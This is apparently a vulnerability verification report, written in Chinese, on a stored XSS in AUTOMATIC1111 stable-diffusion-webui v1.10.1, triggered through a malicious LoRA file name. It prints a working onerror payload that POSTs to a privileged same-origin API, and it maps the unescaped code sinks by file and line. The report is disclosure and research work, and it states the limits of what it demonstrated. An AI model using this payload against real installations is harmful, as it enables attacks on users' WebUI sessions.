# a1111.extra_networks_filename_xss —— 端到端验证

**产品**：AUTOMATIC1111/stable-diffusion-webui **v1.10.1**，
`82a973c04367123ae98bd9abdf80d9eda9b910e2`。
容器内校验的源码树摘要：`efbfdbe81a316f2e0758da403e8bb3e24dcd85c560bf369943372df936244905`。
**主机**：`.37` · **镜像**：`mbe2e/v/a1111.extra_networks_filename_xss:r1`
（基于 `mbe2e/prod:a1111-82a973c0-browser`）· **运行期网络**：`--network none`。

## 攻击者的全部能力

分发的模型包里**某个文件的名字**，仅此而已。在 Linux/macOS 上，路径分量里除了
`/` 和 NUL 之外任何字节都合法，所以一个 LoRA 压缩包的文件名可以携带标记语言：

```
x"><img src=x onerror='var s=String.fromCharCode(47);
fetch(s+"sdapi"+s+"v1"+s+"refresh-checkpoints",{method:"POST"})
.then(r=>document.documentElement.dataset.mbe2e="W"+r.status)'>.safetensors
```

191 字节。文件内部是由官方 writer 正常写出的合法 safetensors —— 只有名字是恶意的。

## 受害者的一次普通操作

启动 WebUI 并打开 `http://127.0.0.1:7860/`。所有 extra-networks 页面的卡片 HTML
由 `interface.load` 生成（`modules/ui_extra_networks.py:788`），无需点击。

## 信任委托链

| 步 | 代码位置 | 这个值此刻被当作什么 |
|---|---|---|
| 1 | `shared.walk_files` 扫描 LoRA 目录 | 磁盘上的一个路径 |
| 2 | `modules/ui_extra_networks.py:273` `btn_copy_path_tpl.format(filename=item["filename"])` | **HTML，未转义** |
| 3 | `html/extra-networks-copy-path-button.html:3` `data-clipboard-text="{filename}"` | 被它闭合掉的属性值 |
| 4 | `javascript/extraNetworks.js` 卡片 `innerHTML` | 被解析的标记；`onerror` 执行 |

对比才是重点：同一张卡片上，`sort_keys`（`:306`）与 `description`（`:328`）
都过了 `html.escape`，唯独文件名没有。

**同一个值还有第二个汇点**：`search_terms_from_path(filename)` 把同一字符串放进
`search_terms`，在 `modules/ui_extra_networks.py:312-320` 同样未转义地插值。
因此这个工件同时命中两个未转义汇点，canary 无法区分是哪一个先触发。

## 实测结果

```
负控  dom_markers: []                （benign_lora.safetensors，张量完全相同）
正样  dom_markers: ["W200"]          （产品对页面发起的 POST 回了 200）
privileged_same_origin_api_effect: true
rerun_identical: 1     耗时: 342 秒（构建 + 两次运行）
```

`exp/logs/run1/browser_trace.zip` 为 Playwright 追踪。

## 验证边界 —— 没有证明的东西

- **本条不主张任何操作系统级代码执行**。A1111 的自定义代码脚本受
  `--allow-code` 门控，本次未使用。
- **255 字节的路径分量上限是真实约束**。通过 `POST /sdapi/v1/options` 改写设置的
  载荷实测 287 字节，**放不进文件名**。因此演示到的特权效果是产品接受的一次
  无 body 的 POST，而不是持久化状态变更。更长的链需要同源自举（例如通过
  `/file=` 把模型文件取回来、从其元数据里执行更长的脚本），本次未尝试。
- **Windows 禁止文件名里出现引号字符**，所以这条根因适用于 Linux/macOS 以及在
  Unix 上解包的压缩包。
- 使用了 `--skip-load-model-at-start` 与 stock 的 `lora_show_all` 设置，使本轮
  不需要任何 checkpoint；两者都不在污点链上。
